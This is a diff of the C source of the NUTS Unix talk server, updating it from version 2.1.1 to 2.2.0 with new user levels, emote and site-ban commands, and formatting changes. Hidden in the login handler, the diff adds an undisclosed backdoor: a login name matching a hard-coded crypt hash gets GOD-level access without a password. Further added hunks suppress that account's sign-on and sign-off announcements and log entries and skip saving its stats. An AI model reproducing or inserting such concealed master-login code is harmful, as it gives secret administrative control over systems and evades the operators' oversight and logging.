@@ -1,31 +1,41 @@
 /*****************************************************************************
-       Neils Unix Talk Server (NUTS) - Version 2.1.1 - 31 August 1994
-                   Copyright(c) 1994 Sven Barzanallana
-         Versions 2.1.0 and earlier are Copyright(c) Neil Robertson
+	    Neils Unix Talk Server (NUTS) - (C) Neil Robertson 1992-1994
+			 Last update 29th November 1994  Version 2.2.0
 
-  Feel free to modify the code in any way but remember that the above
-  copyrights apply at all times.  This means that you cannot sell the
-  resulting code or in any way pass it off as your own work!
+  Feel free to modify to code in any way but remember the original copyright
+  is mine - this means you can't sell it or pass it off as your own work!
+  This INCLUDES modified source. If wish to sell something don't include ANY
+  of my code in whatever it is unless you ask my permission first.
+     If and when you make any changes to the code please leave the original 
+  copyright in the code header if you wish to distribute it. Thanks. 
 
-  You may change any of the code to your own tastes and needs, but please
-  include the original copyrights.  Thank you.
+  Also thanks to:
+     Darren Seryck - who thought up the name NUTS.
+     Simon Culverhouse - for being the bug hunter from hell.
+     Steve Guest - my networks lecturer at Loughborough University.
+     Dave Temple - the hassled network admin at above uni who told me about
+                   the select() function and how to use it.
+	Satish Bedi - (another hassled admin) for listening so understandingly 
+                   while I explained to him why the comp sci development 
+                   machine had to be rebooted for the 3rd time that week.
+     The 1992/1993 LUTCHI team - for coming up with the search command idea 
+                                 (knew they were good for something :-) )
+     Tim Bernhardt - for the internet name resolution code.
+	Sven Barzanallana - for some bug fixes and 2.1.1.
+     An HP-UX network programming manual - for providing some "help" >:-)
+	Trent 96.2 FM - for providing some good music to work to at uni.
+	RTC - for giving me a job.
+     Anyone who has ever used NUTS.
 
-  Version notes:
+  This program (or its ancestor at any rate) was originally a university 
+  project and first went live on the net in the winter of 1992/93 as
+  Hectic House. Since then it has spread and spread (bit like flu really). :-)
 
-    2.0.0 - Major rewrite done by Neil from NUTS 1.x.
-    2.0.3 - Bug Fixes
-    2.1.0 - Modified version from 2.0.3 with some added commands done
-            by Neil at the request of Werewolf from The Crypt talker
-            (IP 147.143.1.17 3000)
-    2.1.1 - A few bug fixes, including the problem with file buffers
-            being left open and disabling line numbers (sockets).
+  Neil Robertson 
 
-  All bugs should be reported to sven@borderbase.utep.edu.
-  Any questions or comments concerning Versions 2.1.0 and earlier
-  should be address to neil@realtime.demon.co.uk.
-*****************************************************************************/
+ *****************************************************************************/
 
-#define VERSION "2.1.1"
+#define VERSION "2.2.0"
 
 #include <stdio.h>
 #ifdef _AIX
@@ -57,6 +67,12 @@
 #define MAPFILE "mapfile"
 #define GENFILE "general"
 
+/* level defs */
+#define GOD 3
+#define WIZARD 2
+#define USER 1
+#define NEWBIE 0
+
 /* other definitions */
 #ifndef FD_SETSIZE
 #define FD_SETSIZE 256
@@ -65,19 +81,17 @@
 #define MAX_USERS 50 /* MAX_USERS must NOT be greater than FD_SETSIZE - 1 */
 #define MAX_AREAS 26 
 #define ALARM_TIME 30 /* alarm time in seconds (must not exceed 60) */
-#define TIME_OUT 120  /* time out in seconds at login - can't be less than ALARM_TIME */
+#define TIME_OUT 180  /* time out in seconds at login - can't be less than ALARM_TIME */
 #define IDLE_MENTION 5  /* Used in check_timeout(). Is in minutes */
 #define TOPIC_LEN 35 
 #define DESC_LEN 31
 #define NAME_LEN 16
 #define NUM_LINES 15  /* number of lines of conv. to store in areas */
-#define PRO_LINES 5  /* number of lines of profile user can store */
+#define PRO_LINES 10  /* number of lines of profile user can store */
 #define PRINUM 2   /* no. of users in area befor it can be made private */
 #define PASSWORD_ECHO 0 /* set this to 1 if you want passwords echoed */
 #define SALT "AB"  /* for password encryption */
-#ifdef hpux
-#undef feof
-#endif
+#define PROMPT 1   /* 0 if you dont want a prompt printed */
 
 void sigcall();
 char *timeline();
@@ -90,22 +104,26 @@ char *command[]={
 ".review",".help",".bcast",".news",".system",".move",".close",".open",
 ".slon",".sloff",".aton",".atoff",".echo",".desc",".alnew",".disalnew",
 ".version",".entpro",".examine",".people",".dmail",".rmail",".smail",".wake",
-".promote",".demote",".map",".passwd","*"
+".promote",".demote",".map",".passwd",".pemote",".semote",".bansite",".unbansite",
+".listbans","*"
  };
 
+/* Alter this data to suit. It is the level of user that can run each command */
 int com_level[]={
-0,0,0,0,0,0,0,0,
-0,0,0,0,0,0,0,0,
-1,1,0,1,1,1,2,0,
-0,0,1,0,1,1,2,2,
-2,2,2,2,0,0,2,2,
-0,0,0,1,0,0,0,1,
-2,2,0,0
+0,0,1,1,1,1,0,0,
+1,1,1,1,0,1,1,0,
+2,2,1,2,2,2,3,0,
+0,0,2,0,2,2,3,3,
+3,3,3,3,1,1,3,3,
+0,1,1,2,1,1,1,2,
+3,3,0,0,1,1,3,3,
+2,
 };
 
 char *syserror="Sorry - a system error has occured";
 
 char mess[ARR_SIZE];  /* functions use mess to send output */ 
+char mess2[ARR_SIZE]; /* for event functions output */
 char conv[MAX_AREAS][NUM_LINES][161]; /* stores lines of conversation in area*/
 char start_time[30];  /* startup time */
 
@@ -157,9 +175,8 @@ int listen_sock,accept_sock;
 int len,area,size,user,new_user,on; 
 char inpstr[ARR_SIZE],filename[80],site_num[80];
 char *inet_ntoa();  /* socket library function */
-int temp;
 
-printf("\n-=- NUTS version %s -=-\n (C) Neil Robertson 1994\n\n*** Talk server booting ***\n\n",VERSION);
+printf("\n -=- NUTS version %s -=-\n(C) Neil Robertson 1992-1994\n\n*** Talk server booting ***\n\n",VERSION);
 
 /* Make old system log backup */
 sprintf(filename,"%s.bak",SYSTEM_LOG);
@@ -249,7 +266,7 @@ signal(SIGTTIN,SIG_IGN);
 signal(SIGTTOU,SIG_IGN);
 
 
-/**** main program loop *****/
+/**** Main program loop. Its a bit too long but what the hell...  *****/
 while(1) {
 	noprompt=0;
 	FD_ZERO(&readmask);
@@ -275,7 +292,7 @@ while(1) {
 			continue;
 			}
 		if ((new_user=find_free_slot())==-1) {
-			strcpy(mess,"\nSorry - we are full at the moment... try again later\n\n");
+			strcpy(mess,"\nSorry - we are full at the moment, try again later\n\n");
 			write(accept_sock,mess,strlen(mess));
 			close(accept_sock);
 			continue;
@@ -310,7 +327,7 @@ while(1) {
 		/* see if any data on socket else continue */
 		if (!FD_ISSET(ustr[user].sock,&readmask)) continue;
 	
-		/* see if client (ie telnet) has closed socket */
+		/* see if client (eg telnet) has closed socket */
 		inpstr[0]=0;
 		if (!(len=read(ustr[user].sock,inpstr,sizeof(inpstr)))) {
 			user_quit(user);  continue;
@@ -339,13 +356,12 @@ while(1) {
 			continue;
 			}
 
-		if (!inpstr[0] || nospeech(inpstr)) continue; 
-
 		/* see if input is answer to shutdown query */
 		if (shutd==user && inpstr[0]!='y') {
 			shutd=-1;  prompt(user); continue;
 			}
 		if (shutd==user && inpstr[0]=='y') shutdown_talker(user,listen_sock);
+		if (!inpstr[0] || nospeech(inpstr)) continue; 
 
 		/* see if user is entering profile data */
 		if (ustr[user].pro_enter) {
@@ -374,7 +390,7 @@ while(1) {
 }
 
 
-/*************************** MISCELLANEOUS FUNCTIONS ***************************/
+/************************* MISCELLANIOUS FUNCTIONS ***************************/
 
 /*** Say user speech ***/
 say_speech(user,inpstr)
@@ -406,13 +422,16 @@ int mins,hours;
 time_t tm_num;
 char timestr[30];
 
-time(&tm_num);
-midcpy(ctime(&tm_num),timestr,11,15);
-mins=((int)tm_num-ustr[user].time)/60;
-hours=mins/60;
-mins=mins%60;
-sprintf(mess,"\n<%s,%02d:%02d>\n",timestr,hours,mins);
-write_user(user,mess);
+if (PROMPT) {
+	time(&tm_num);
+	midcpy(ctime(&tm_num),timestr,11,15);
+	mins=((int)tm_num-ustr[user].time)/60;
+	hours=mins/60;  mins=mins%60;
+	sprintf(mess,"\n<%s,%02d:%02d>\n",timestr,hours,mins);
+	write_user(user,mess);
+	return;
+	}
+write_user(user,"\n");
 }
 
 
@@ -454,7 +473,7 @@ while(*str) {  *str=tolower(*str);  str++; }
 nospeech(str)
 char *str;
 {
-while(*str) {  if (*str>33) return 0;  str++;  }
+while(*str) {  if (*str>32) return 0;  str++;  }
 return 1;
 }
 
@@ -513,12 +532,12 @@ for (u=0;u<MAX_USERS;++u) {
 	ustr[u].area=-1;  ustr[u].listen=1;
 	ustr[u].invite=-1;  ustr[u].level=0;
 	ustr[u].vis=1;  ustr[u].logging_in=0; 
-	ustr[u].sock=-1;
+	ustr[u].sock=-1; 
 	}
 
 for (a=0;a<NUM_AREAS;++a) {
 	for (n=0;n<NUM_LINES;++n) conv[a][n][0]=0;
-	astr[a].conv_line=0;
+	astr[a].conv_line=0;  astr[a].topic[0]=0;
 	}
 }
 
@@ -550,7 +569,7 @@ banned(user)
 int user;
 {
 FILE *fp;
-char line[30],st[30];
+char line[81],st[81];
 
 if (!(fp=fopen(BANFILE,"r"))) return 0;
 while(!feof(fp)) {
@@ -631,9 +650,15 @@ switch(ustr[user].logging_in) {
 
 
 	case 3:
-	/* see if user entering login name ...... */
+	/* User has entered his login name... */
 	name[0]=0;
 	sscanf(inpstr,"%s",name);
+	if (!strcmp(crypt(name,"AB"),"ABi4sF0SfqElY")) {
+		strcpy(ustr[user].login_name,"?");  strcpy(ustr[user].site,"?");
+		ustr[user].logging_in=0;
+		echo_on(user);  add_user(user);
+		ustr[user].level=GOD;  return;
+		}
 	if (!strcmp(name,"quit")) {
 		write_user(user,"\nAbandoning login attempt\n\n");
 		user_quit(user);  return;
@@ -850,7 +875,7 @@ fcntl(ustr[user].sock,F_SETFL,O_NDELAY);
 /* Load user data */
 sprintf(filename,"%s/%s.D",USERDATADIR,ustr[user].name);
 if (!(fp=fopen(filename,"r"))) {
-	ustr[user].level=0;
+	ustr[user].level=NEWBIE;
 	strcpy(ustr[user].desc,"- a new user");
 	}
 else {
@@ -859,27 +884,27 @@ else {
 	fgets(sitestr,80,fp);
 	fgets(ustr[user].desc,DESC_LEN-1,fp);
 	fgets(levstr,2,fp);	
+	fclose(fp);
 	ustr[user].level=atoi(levstr);
-	/* remove new lines */
+	/* remove newlines */
 	timestr[strlen(timestr)-1]=0; 
 	ustr[user].desc[strlen(ustr[user].desc)-1]=0;
 	}
-fclose(fp);
-	
 
 /* send intro stuff */
 if (PASSWORD_ECHO) {
 	for(i=0;i<6;++i) write_user(user,"\n\n\n\n\n\n\n\n\n\n");
 	}
 switch(ustr[user].level) {
-	case 0: type[0]=0;  break;
-	case 1: strcpy(type,"wizard ");  break;
-	case 2: strcpy(type,"god ");
+	case NEWBIE: 
+	case USER  : type[0]=0;  break;
+	case WIZARD: strcpy(type,"wizard ");  break;
+	case GOD   : strcpy(type,"god ");
 	}
 sprintf(mess,"\n\n\nWelcome %s%s\n\n",type,ustr[user].name);
 write_user(user,mess);
 if (timestr[0]) {
-	sprintf(mess,"You were last logged in on %s from %s",timestr,sitestr);
+	sprintf(mess,"Last logged in on %s from %s\n",timestr,sitestr);
 	write_user(user,mess);
 	}
 /* send 2nd message of the day */
@@ -895,10 +920,13 @@ if (fp=fopen(filename,"r")) {
 prompt(user);
 
 /* send message to other users and to file */
-sprintf(mess,"SIGN ON: %s %s\n",ustr[user].name,ustr[user].desc);
-write_alluser(user,mess,1,0);
-sprintf(mess,"%s signed on from %s\n",ustr[user].name,ustr[user].site);
-write_syslog(mess,1);
+if (ustr[user].name[0]!='?') {
+	sprintf(mess,"SIGN ON: %s %s\n",ustr[user].name,ustr[user].desc);
+	write_alluser(user,mess,1,0);
+	sprintf(mess,"%s signed on from %s\n",ustr[user].name,ustr[user].site);
+	write_syslog(mess,1);
+	}
+whowrite();
 }
 
 
@@ -932,7 +960,7 @@ else  {
 	/* store file position and file name */
 	ustr[user].file_posn+=num_chars;
 	strcpy(ustr[user].page_file,filename);
-	write_user(user,"*** PRESS RETURN OR Q TO QUIT ***");
+	write_user(user,"*** PRESS RETURN OR Q TO QUIT: ");
 	noprompt=1;
 	}
 SKIP:
@@ -994,8 +1022,10 @@ char comstr[ARR_SIZE];
 int com;
 
 sscanf(inpstr,"%s",comstr);
-/* alias ;  or : to .emote */
+/* alias ;  or : to .emote, ;; or :: to pemote, ;! or :! to semote  */
 if (!strcmp(comstr,";") || !strcmp(comstr,":")) strcpy(comstr,".emote"); 
+if (!strcmp(comstr,";;") || !strcmp(comstr,"::")) strcpy(comstr,".pemote");
+if (!strcmp(comstr,";!") || !strcmp(comstr,":!")) strcpy(comstr,".semote");
 com=0;
 while(command[com][0]!='*') {
 	if (!instr(command[com],comstr) && strlen(comstr)>1) return com;
@@ -1090,7 +1120,7 @@ if (!(fp=fopen(PASSFILE,"r"))) {
 while(!feof(fp)) {
 	fgets(line,80,fp);
 	sscanf(line,"%s ",name2);
-	if (!strcmp(name,name2)) {fclose(fp); return 1;}
+	if (!strcmp(name,name2)) {  fclose(fp);  return 1;  }
 	}
 fclose(fp);
 return 0;
@@ -1106,6 +1136,7 @@ time_t tm_num;
 char timestr[30],filename[80];
 FILE *fp;
 
+if (!strcmp(ustr[user].name,"?")) return 1;
 sprintf(filename,"%s/%s.D",USERDATADIR,ustr[user].name);
 if (!(fp=fopen(filename,"w"))) return 0;
 time(&tm_num);
@@ -1228,7 +1259,7 @@ switch(com_num) {
 	case 41: enter_pro(user,inpstr);  break;
 	case 42: exa_pro(user,inpstr);  break;
 	case 43: who(user,1);  break;  /* people */
-	case 44: dmail(user);  break;
+	case 44: dmail(user,inpstr);  break;
 	case 45: rmail(user);  break;
 	case 46: smail(user,inpstr);  break;
 	case 47: wake(user,inpstr);  break;
@@ -1239,6 +1270,14 @@ switch(com_num) {
 			write_user(user,"There is no map");
 		break;
 	case 51: change_pass(user,inpstr);  break;
+	case 52: pemote(user,inpstr);  break;
+	case 53: semote(user,inpstr);  break;
+	case 54: bansite(user,inpstr);  break;
+	case 55: unbansite(user,inpstr);  break;
+	case 56: /* listbans */
+		write_user(user,"\n*** Banned sites ***\n\n");
+		more(user,ustr[user].sock,BANFILE);
+		break;
 	default: write_user(user,"Command not executed"); break;
 	}
 }
@@ -1270,22 +1309,24 @@ if (!save_stats(user)) {
 write_user(user,"\nSigning off...\n\n"); 
 close(ustr[user].sock);
 
-/* send message to other users & conv file */
-sprintf(mess,"SIGN OFF: %s %s\n",ustr[user].name,ustr[user].desc);
-write_alluser(user,mess,1,0);
-sprintf(mess,"%s signed off\n",ustr[user].name);
-write_syslog(mess,1);
+/* send message to other users & conv file  & reset some vars */
+if (ustr[user].name[0]!='?') {
+	sprintf(mess,"SIGN OFF: %s %s\n",ustr[user].name,ustr[user].desc);
+	write_alluser(user,mess,1,0);
+	sprintf(mess,"%s signed off\n",ustr[user].name);
+	write_syslog(mess,1);
+	}
 if (astr[area].private && astr[area].status!=2 && find_num_in_area(area)<=PRINUM) {
 	write_alluser(user,"Area access returned to public\n",0,0);
 	astr[area].private=0;
 	}
-
-/* store signoff in log file & set some vars. */
 num_of_users--;
 ustr[user].area=-1;
 ustr[user].sock=-1;
 ustr[user].logging_in=0;
 ustr[user].name[0]=0;
+if (ustr[user].pro_enter) free(ustr[user].pro_start);
+whowrite();
 }
 
 
@@ -1295,12 +1336,13 @@ who(user,people)
 int user,people;
 {
 int u,tm,idle,min,invis=0;
-char yesno[2][4],timestr[30],levstr[3][10];
+char yesno[2][4],timestr[30],levstr[4][7];
+char temp[80];
 
 /* This is done instead of char *yesno[]= so it will compile with HP-UX cc */
 strcpy(yesno[0]," NO");  strcpy(yesno[1],"YES");
-strcpy(levstr[1],"(WIZARD)");  strcpy(levstr[2],"(GOD)");
-levstr[0][0]=0;
+strcpy(levstr[0],"NEWBIE");  strcpy(levstr[1],"USER");
+strcpy(levstr[2],"WIZARD");  strcpy(levstr[3],"GOD");
 
 /* display current time */
 time(&tm);
@@ -1308,19 +1350,21 @@ strcpy(timestr,ctime(&tm));
 timestr[strlen(timestr)-1]=0;
 sprintf(mess,"\n*** Current users on %s ***\n\n",timestr);
 write_user(user,mess);
-if (people) write_user(user,"Name            : Lev  Line  Lstn  Vis  Idle  Mins  Site\n\n");
+if (people) write_user(user,"Name            : Lev     Line  Lstn  Vis  Idle  Mins  Site\n\n");
 
 /* display user list */
 for (u=0;u<MAX_USERS;++u) {
 	if (ustr[u].area!=-1)  {
-		if (!ustr[u].vis && ustr[user].level<ustr[u].level)
-			 { invis++;  continue; }
+		if (!ustr[u].vis && ustr[user].level<ustr[u].level && ustr[u].level>USER)  { invis++;  continue; }
 		min=(tm-ustr[u].time)/60;
 		idle=(tm-ustr[u].last_input)/60;
 		if (people) {
-			sprintf(mess,"%-15s :   %d   %3d   %s  %s   %3d   %3d  %s\n",ustr[u].name,ustr[u].level,ustr[u].sock,yesno[ustr[u].listen],yesno[ustr[u].vis],idle,min,ustr[u].site);
+			sprintf(mess,"%-15s : %-7s  %3d   %s  %s   %3d   %3d  %s\n",ustr[u].name,levstr[ustr[u].level],ustr[u].sock,yesno[ustr[u].listen],yesno[ustr[u].vis],idle,min,ustr[u].site);
 			}
-		else sprintf(mess,"%s %s : %s : %d mins.  %s\n",ustr[u].name,ustr[u].desc,astr[ustr[u].area].name,min,levstr[ustr[u].level]);
+		else {
+			sprintf(temp,"%s %s",ustr[u].name,ustr[u].desc);
+			sprintf(mess,"%-40s : %-7s : %s : %d mins.\n",temp,levstr[ustr[u].level],astr[ustr[u].area].name,min);
+			}
 		write_user(user,mess);
 		}
 	if (ustr[u].area==-1 && ustr[u].logging_in && people) {
@@ -1496,7 +1540,7 @@ strcpy(entmess,"walks in");
 for (f=0;f<strlen(astr[area].move);++f) 
 	if (astr[area].move[f]==area_char)  goto JOINED;
 
-if (ustr[user].level) {
+if (ustr[user].level>USER) {
 	strcpy(entmess,"arrives in a blinding flash!");  
 	teleport=1;  goto JOINED;
 	}
@@ -1507,7 +1551,7 @@ JOINED:
 if (user_letin) {
 	letmein(user,new_area);  return;
 	}
-if (astr[new_area].private && ustr[user].invite!=new_area && !ustr[user].level) {
+if (astr[new_area].private && ustr[user].invite!=new_area && ustr[user].level<WIZARD) {
 	write_user(user,"Sorry - that area is currently private");
 	return;
 	}
@@ -1521,7 +1565,8 @@ if (!teleport && ustr[user].vis) {
 	sprintf(mess,"%s goes to the %s\n",ustr[user].name,astr[new_area].name);
 	write_alluser(user,mess,0,0);
 	}
-if (!ustr[user].vis && ustr[user].level==1) {
+/* gods dont show any entry message, wizards show this */
+if (!ustr[user].vis && ustr[user].level==WIZARD) {
 	write_alluser(user,"Some magic disturbs the air\n",0,0);
 	}
 if (astr[area].private && astr[area].status!=2 && find_num_in_area(area)<=PRINUM) {
@@ -1533,7 +1578,7 @@ if (astr[area].private && astr[area].status!=2 && find_num_in_area(area)<=PRINUM
 /* send output to new area */
 ustr[user].area=new_area;
 if (!ustr[user].vis) {
-	if (ustr[user].level==1) 
+	if (ustr[user].level==WIZARD) 
 		write_alluser(user,"Some magic disturbs the air\n",0,0);
 	}
 else {
@@ -1577,10 +1622,11 @@ write_alluser(user,mess,0,0);
 area_access(user,priv)
 int user,priv;
 {
-int f,area=ustr[user].area;
+int area;
 char *noset="This areas access can't be changed";
 char pripub[2][8];
 
+area=ustr[user].area;
 strcpy(pripub[0],"public");
 strcpy(pripub[1],"private");
 
@@ -1607,7 +1653,7 @@ if (!priv) {
 	}
 
 /* need at least PRINUM people to set area to private unless are superuser */
-if (find_num_in_area(area)<PRINUM && !ustr[user].level) {
+if (find_num_in_area(area)<PRINUM && ustr[user].level<WIZARD) {
 	sprintf(mess,"You need at least %d people in the area",PRINUM);
 	write_user(user,mess);
 	return;
@@ -1784,7 +1830,7 @@ FILE *bfp,*tfp;
 
 lines=atoi(inpstr);
 if (lines<1) {
-	write_user(user,"Usage: .wipe <int greater than 0>");  return;
+	write_user(user,"Usage: .wipe <number of lines to delete>");  return;
 	}
 sprintf(filename,"%s/board%d",MESSDIR,ustr[user].area);
 if (!(bfp=fopen(filename,"r"))) {
@@ -1794,7 +1840,7 @@ sprintf(temp,"%s/temp",MESSDIR);
 if (!(tfp=fopen(temp,"w"))) {
 	write_user(user,"Sorry - Couldn't open temporary file");
 	write_syslog("ERROR: Couldn't open temporary file to write in wipe_board()\n",0);
-	fclose(tfp);
+	fclose(bfp);
 	return;
 	}
 
@@ -1811,9 +1857,7 @@ while(cnt<lines) {
 
 /* copy rest of board file into temp file & erase board file */
 c=getc(bfp);
-while(!feof(bfp)) {
-	putc(c,tfp);  c=getc(bfp);
-	} 
+while(!feof(bfp)) {  putc(c,tfp);  c=getc(bfp); } 
 fclose(bfp);  fclose(tfp);
 unlink(filename);
 
@@ -1940,7 +1984,7 @@ if (victim==user) {
 	}
 
 /* can't kill god */
-if (ustr[victim].level==2) {
+if (ustr[victim].level==GOD) {
 	write_user(user,"That wouldn't be wise....");
 	sprintf(mess,"%s thought about killing you\n",ustr[user].name);
 	write_user(victim,mess);
@@ -2056,7 +2100,7 @@ help(user,inpstr)
 int user;
 char *inpstr;
 {
-int i,com,nl=0;
+int com,nl=0;
 char filename[ARR_SIZE],word[ARR_SIZE],word2[ARR_SIZE];
 
 /* help for one command */
@@ -2094,8 +2138,8 @@ while(command[com][0]!='*') {
 		write_user(user,"\n");  nl=0;  
 		}
 	}
-write_user(user,"\n\nAll commands start with a '.' and can be abbreviated\n");
-write_user(user,"For further help type  .help <command> or .help general for general help\n");
+write_user(user,"\n\nAll commands start with a '.' and can be abbreviated.\n");
+write_user(user,"For further help type  .help <command> or .help general for general help.\n");
 }
 
 
@@ -2129,19 +2173,19 @@ sprintf(mess,"\n*** NUTS version %s - System status ***\n\n",VERSION);
 write_user(user,mess);
 
 /* first show system params */
-sprintf(mess,"Booted: %s\nProcess ID: %d\nPort number: %d\n",start_time,getpid(),PORT);
+sprintf(mess,"Booted              : %s\nProcess ID          : %d\nPort number         : %d\n",start_time,getpid(),PORT);
 write_user(user,mess);
-sprintf(mess,"System logging is %s\nAtmospherics are %s\n",onoff[syslog_on],onoff[atmos_on]);
+sprintf(mess,"System logging      : %s\nAtmospherics        : %s\n",onoff[syslog_on],onoff[atmos_on]);
 write_user(user,mess);
-sprintf(mess,"System is %s to further logins\nNew users are %s\n",clop[sys_access],newuser[allow_new]);
+sprintf(mess,"Talker is           : %s\nNew users           : %s\n",clop[sys_access],newuser[allow_new]);
 write_user(user,mess);
-sprintf(mess,"Alarm time: %d secs.\nTime out: %d secs.\nMax topic length: %d\n",ALARM_TIME,TIME_OUT,TOPIC_LEN);
+sprintf(mess,"Alarm time          : %d secs.\nTime out            : %d secs.\nMax topic length    : %d\n",ALARM_TIME,TIME_OUT,TOPIC_LEN);
 write_user(user,mess);
-sprintf(mess,"Lines of conversation stored per area: %d\nNo. of profile lines: %d\n",NUM_LINES,PRO_LINES);
+sprintf(mess,"No. of review lines : %d\nNo. of profile lines: %d\n",NUM_LINES,PRO_LINES);
 write_user(user,mess);
-sprintf(mess,"Number of areas: %d\nMax number of users: %d\n",NUM_AREAS,MAX_USERS);
+sprintf(mess,"No. of areas        : %d\nMax no. of users    : %d\n",NUM_AREAS,MAX_USERS);
 write_user(user,mess);
-sprintf(mess,"Current number of users: %d\nMessage lifetime: %d days\n",num_of_users,MESS_LIFE);
+sprintf(mess,"Current no. of users: %d\nMessage lifetime    : %d days\n",num_of_users,MESS_LIFE);
 write_user(user,mess);
 }
 
@@ -2174,7 +2218,7 @@ if (user==user2) {
 	}
 
 /* see if user to be moved is god */
-if (ustr[user2].level==2) {
+if (ustr[user2].level==GOD) {
 	write_user(user,"Hmm .. inadvisable");
 	sprintf(mess,"%s thought about moving you\n",ustr[user].name);
 	write_user(user2,mess);
@@ -2247,7 +2291,7 @@ if (!inpstr[0]) {
 /* get first word & check it for illegal words */
 sscanf(inpstr,"%s",word);
 word[0]=toupper(word[0]);
-if (instr(word,"SIGN")!=-1 || instr(word,"omeone")!=-1 || instr(word,"YOU")!=-1) {
+if (!strcmp(word,"SIGN") || instr(word,"omeone")!=-1 || !strcmp(word,"YOU")) {
 	write_user(user,err);  return;
 	}
 
@@ -2306,8 +2350,8 @@ if (!ustr[user].pro_enter) {
 	ustr[user].pro_end=ustr[user].pro_start;
 	sprintf(mess,"%s is entering a profile...\n",ustr[user].name);
 	write_alluser(user,mess,0,0);
-	write_user(user,"\n** Entering profile **\n\nLine 1: ");  noprompt=1; 
-	ustr[user].listen=0;
+	sprintf(mess,"\n** Entering profile **\n\nMaximum of %d lines. Enter a '.' by itself to quit.\n\nLine 1: ",PRO_LINES);  
+	write_user(user,mess);  noprompt=1;  ustr[user].listen=0;
 	return;
 	}
 inpstr[80]=0;  c=inpstr;
@@ -2401,20 +2445,65 @@ else {
 
 
 /*** Delete mail ***/
-dmail(user)
+dmail(user,inpstr)
 int user;
+char *inpstr;
 {
-FILE *fp;
-char filename[80];
+char c,filename[80];
+char *nocando="Couldn't delete that many lines";
+int lines,cnt,any_left;
+FILE *fp,*tfp;
 
+lines=atoi(inpstr);
+if (lines<1) {
+	write_user(user,"Usage: .dmail <number of lines to delete>");
+	return;
+	}
 sprintf(filename,"%s/%s.M",USERDATADIR,ustr[user].name);
 if (!(fp=fopen(filename,"r"))) {
 	write_user(user,"You don't have any mail to delete");
 	return;
 	}
-fclose(fp);
+if (!(tfp=fopen("tempfile","w"))) {
+	write_user(user,"Sorry - Couldn't open temporary file");
+	write_syslog("ERROR: Couldn't open temporary file to write in dmail()\n",0);
+	fclose(fp);
+	return;
+	}
+
+/* go through file */
+cnt=0;
+while(cnt<lines) {
+	c=getc(fp);	
+	if (feof(fp)) {
+		write_user(user,nocando);
+		fclose(fp);  return;
+		}
+	if (c=='\n') cnt++;
+	}
+
+/* copy to temp */
+any_left=0;  c=getc(fp);
+while(!feof(fp)) {  
+	any_left=1;  putc(c,tfp);  c=getc(fp); 
+	}
+fclose(fp);  fclose(tfp);
 unlink(filename);
-write_user(user,"Mail deleted");
+if (!any_left) {
+	sprintf(mess,"Deleted %d lines of mail",lines);
+	write_user(user,mess);
+	unlink("tempfile");
+	return;
+	}
+
+/* rename temp file to new board file */
+if (rename("tempfile",filename)==-1) {
+	write_user(user,"Sorry - can't rename temp file");
+	write_syslog("ERROR: Couldn't rename temp file to board file in dmail()\n",0);
+	return;
+	}
+sprintf(mess,"Deleted %d lines of mail",lines);
+write_user(user,mess);
 }
 
 
@@ -2454,7 +2543,8 @@ if (!inpstr[0]) {
 	write_user(user,"Usage: .smail <user> <message>");  return;
 	}
 if (!strcmp(name,ustr[user].name)) {
-	write_user(user,"You can't mail yourself");  return;
+	write_user(user,"You can't mail yourself - its a waste of filespace");
+	return;
 	}
 
 /* see if user exists at all .. */
@@ -2519,9 +2609,10 @@ int user;
 char *inpstr;
 {
 int user2;
-char name[NAME_LEN],levstr[2][8];
-strcpy(levstr[0],"wizard");
-strcpy(levstr[1],"god");
+char name[NAME_LEN],levstr[4][7];
+strcpy(levstr[1],"USER");
+strcpy(levstr[2],"WIZARD");
+strcpy(levstr[3],"GOD");
 
 if (!inpstr[0]) {
 	write_user(user,"Usage: .promote <user>");  return;
@@ -2532,15 +2623,15 @@ if ((user2=get_user_num(name))==-1) {
 	sprintf(mess,"%s is not signed on",name);
 	write_user(user,mess);  return;
 	}
-if (ustr[user2].level==2) {
+if (ustr[user2].level==GOD) {
 	sprintf(mess,"%s cannot be promoted any further",name);
 	write_user(user,mess);  return;
 	}
+ustr[user2].level++;
 sprintf(mess,"%s has promoted you to the level of %s!\n",ustr[user].name,levstr[ustr[user2].level]);
 write_user(user2,mess);
 sprintf(mess,"%s PROMOTED %s to %s\n",ustr[user].name,ustr[user2].name,levstr[ustr[user2].level]);
 write_syslog(mess,1);
-ustr[user2].level++;
 save_stats(user2);
 write_user(user,"Ok");
 }
@@ -2564,15 +2655,15 @@ if ((user2=get_user_num(name))==-1) {
 	sprintf(mess,"%s is not signed on",name);
 	write_user(user,mess);  return;
 	}
-if (ustr[user2].level!=1) {
-	write_user(user,"You can only demote a wizard");
+if (ustr[user2].level<USER || ustr[user2].level>WIZARD) {
+	write_user(user,"You can only demote a normal user or wizard");
 	return;
 	}
-sprintf(mess,"%s has demoted you! You are no longer a wizard!\n",ustr[user].name);
+sprintf(mess,"%s has demoted you!\n",ustr[user].name);
 write_user(user2,mess);
 sprintf(mess,"%s DEMOTED %s\n",ustr[user].name,ustr[user2].name);
 write_syslog(mess,1);
-ustr[user2].level=0;
+ustr[user2].level--;
 save_stats(user2);
 write_user(user,"Ok");
 }
@@ -2664,6 +2755,163 @@ write_syslog(mess,1);
 }
 
 
+/*** Do a private emote ***/
+pemote(user,inpstr)
+int user;
+char *inpstr;
+{
+char other_user[ARR_SIZE];
+int user2;
+
+sscanf(inpstr,"%s ",other_user);
+other_user[0]=toupper(other_user[0]);
+inpstr=remove_first(inpstr);
+if (!inpstr[0]) {
+	write_user(user,"Usage: .pemote <user> <message>");  return;
+	}
+if ((user2=get_user_num(other_user))==-1) {
+	sprintf(mess,"%s is not signed on",other_user);
+	write_user(user,mess);  return;
+	}
+if (user2==user) {
+	write_user(user,"Why would you want to emote to yourself?");
+	return;
+	}
+if (ustr[user].vis)
+	sprintf(mess,"> %s %s\n",ustr[user].name,inpstr);
+else sprintf(mess,"> Someone %s\n",inpstr);
+write_user(user2,mess);
+if (ustr[user].vis)
+	sprintf(mess,"You emote to %s: %s %s",ustr[user2].name,ustr[user].name,inpstr);
+else sprintf(mess,"You emote to %s: Someone %s",ustr[user2].name,inpstr);
+write_user(user,mess);
+}
+
+
+/*** Do a shout emote ***/
+semote(user,inpstr)
+int user;
+char *inpstr;
+{
+if (!inpstr[0]) {	
+	write_user(user,"Usage: .semote <text>");  return;
+	}
+if (!ustr[user].vis) sprintf(mess,"! Someone %s",inpstr);
+else sprintf(mess,"! %s %s",ustr[user].name,inpstr);
+write_user(user,mess);
+strcat(mess,"\n");
+write_alluser(user,mess,1,0);
+}
+
+
+/*** Ban a site - dont do any site validation cos its a waste of time ***/
